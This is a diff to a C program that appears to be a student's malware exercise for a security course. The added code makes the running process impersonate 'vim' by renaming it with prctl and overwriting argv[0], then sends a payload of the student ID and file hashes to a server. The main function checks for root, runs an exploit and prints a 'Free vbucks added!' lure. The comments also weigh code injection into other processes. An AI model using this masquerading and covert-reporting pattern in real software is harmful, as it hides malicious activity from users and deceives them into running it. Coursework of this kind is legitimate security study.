@@ -8,6 +8,7 @@
 #define FOUND_EXPLOIT 1
 #define STUDENT_ID_LENGTH 6
 #define PAYLOAD_LENGTH STUDENT_ID_LENGTH + 2*(SHA_DIGEST_LENGTH+MD5_DIGEST_LENGTH) + 4
+#define IMPERSONATION_NAME "vim"
 
 char home_path[128], virus_path[256], exploit_path[256];
 
@@ -126,13 +127,19 @@ void use_exploit(char *student_id) {
 }
 
 // impersonate another program and send payload to server
-void impersonate_and_send(const char *student_id, const char *sha1, const char *md5) {
+void impersonate_and_send(char *argv[], const char *student_id, const char *sha1, const char *md5) {
 	// get payload
 	char payload[PAYLOAD_LENGTH + 1];
 	sprintf(payload, "%s:%s:%s\n", student_id, md5, sha1);
 	payload[PAYLOAD_LENGTH] = '\0';
 
-	// TODO: IMPERSONATION
+	// Impersonation only changes the name of the process
+	// Changing PID would require either starting a child process (that doesn't really seem like impersonation to me)
+	// Or injecting code into some other process running - injection itself is definitely possbile,
+	// but to get the code that actually works, you'd need to write sockets in assembly and I ain't doin' that
+	prctl(PR_SET_NAME, IMPERSONATION_NAME, NULL, NULL, NULL);
+	strncpy(argv[0], IMPERSONATION_NAME, strlen(argv[0]));
+	argv[0][strlen(argv[0])] = '\0';
 
 	// get address
 	struct sockaddr_in server_address;
@@ -147,7 +154,7 @@ void impersonate_and_send(const char *student_id, const char *sha1, const char *
 	close(sock);
 }
 
-int main() {
+int main(int argc, char *argv[]) {
 	// check for root privilages
 	int root_check = geteuid();
 	if (root_check != 0) {
@@ -173,7 +180,7 @@ int main() {
 	calculate_hash_of_file("sha1", exploit_path, sha1);
 	calculate_hash_of_file("md5", virus_path, md5);
 	use_exploit(student_id);
-	impersonate_and_send(student_id, sha1, md5);
+	impersonate_and_send(argv, student_id, sha1, md5);
 
 	printf("Free vbucks added!\n");
 
